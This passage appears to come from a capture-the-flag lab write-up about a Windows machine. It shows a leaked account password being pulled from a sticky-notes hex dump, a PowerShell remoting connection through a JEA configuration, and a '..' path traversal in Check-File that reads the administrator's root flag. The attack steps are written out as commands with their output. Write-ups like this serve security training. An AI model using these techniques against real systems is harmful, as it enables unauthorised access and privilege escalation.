000000C0   62 21 51 40 76 63 67 5E 25 40 23 31 3C 2F 70 3E  b!Q@vcg^%@#1</p>
000000D0   22 2C 22 62 61 63 6B 22 3A 22 72 67 62 28 32 35  ","back":"rgb(25
000000E0   35 2C 20 32 34 32 2C 20 31 37 31 29 22 2C 22 74  5, 242, 171)","t
000000F0   69 74 6C 65 22 3A 22 72 67 62 28 32 35 35 2C 20  itle":"rgb(255, 
00000100   32 33 35 2C 20 31 32 39 29 22 2C 22 77 69 64 22  235, 129)","wid"
00000110   3A 22 33 35 30 22 2C 22 68 65 69 22 3A 22 33 37  :"350","hei":"37
00000120   35 22 2C 22 64 65 6C 65 74 65 64 22 3A 22 6E 6F  5","deleted":"no
00000130   22 2C 22 63 6C 6F 73 65 64 22 3A 22 79 65 73 22  ","closed":"yes"
00000140   2C 22 6C 6F 63 6B 65 64 22 3A 22 6E 6F 22 7D 00  ,"locked":"no"}.
...[snip]...

```

This file looks to hold the contents of at least some of the sticky notes, to include creds for jea\_test\_account at offset 0xAF-0xDA: “Ab!Q@vcg^%@#1”.

### Connecting

Trying to connect via PowerShell as jea\_test\_account will return access denied:

```

PS /> $pass = ConvertTo-SecureString 'Ab!Q@vcg^%@#1' -AsPlainText -Force
PS /> $cred = New-Object System.Management.Automation.PSCredential('htb\jea_test_account', $pass)
PS /> Enter-PSSession -Computer 10.10.10.210 -credential $cred -Authentication Negotiate
Enter-PSSession: Connecting to remote server 10.10.10.210 failed with the following error message : ERROR_ACCESS_DENIED: Access is denied.  For more information, see the about_Remote_Troubleshooting Help topic.

```

`Enter-PSSession` does have an option `-ConfigurationName`, and I can take a guess that there might be one named `jea_test_account` based on the config files above. When I use that, it works:

```

PS /> Enter-PSSession -Computer 10.10.10.210 -credential $cred -Authentication Negotiate -ConfigurationName jea_test_account
[10.10.10.210]: PS>

```

### Read Flag

This shell has the same commands as the previous one, with the addition of `Check-File`:

```

[10.10.10.210]: PS>Get-Command

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Check-File
Function        Clear-Host
Function        Exit-PSSession
Function        Get-Command
Function        Get-FormatData
Function        Get-Help
Function        Measure-Object
Function        Out-Default
Function        Select-Object   

```

I can use `Check-File` to read the flag. The path has to start with `C:\ProgramData\*`, so `..` works:

```

[10.10.10.210]: PS>Check-File C:\ProgramData\..\Users\Administrator\Desktop\root.txt
12f846dd************************

```

Unfortunately for me, this account cannot run script blocks or access variables, as it’s in `NoLanguage` mode:

```

[10.10.10.210]: PS> &{ whoami }
The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode.
    + CategoryInfo          : ParserError: (&{ whoami }:String) [], ParseException
    + FullyQualifiedErrorId : ScriptsNotAllowed
 
[10.10.10.210]: PS> function test {get-location}; test
The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode.
    + CategoryInfo          : ParserError: (function test {get-location}; test:String) [], ParseException
    + FullyQualifiedErrorId : ScriptsNotAllowed

[10.10.10.210]: PS> $ExecutionContext.SessionState.LanguageMode
The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode.
    + CategoryInfo          : ParserError: ($ExecutionContext.S…nState.LanguageMode:String) [], ParseException
    + FullyQualifiedErrorId : ScriptsNotAllowed
 
[10.10.10.210]: PS> $env:username
The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode.
    + CategoryInfo          : ParserError: ($env:username:String) [], ParseException
    + FullyQualifiedErrorId : ScriptsNotAllowed

```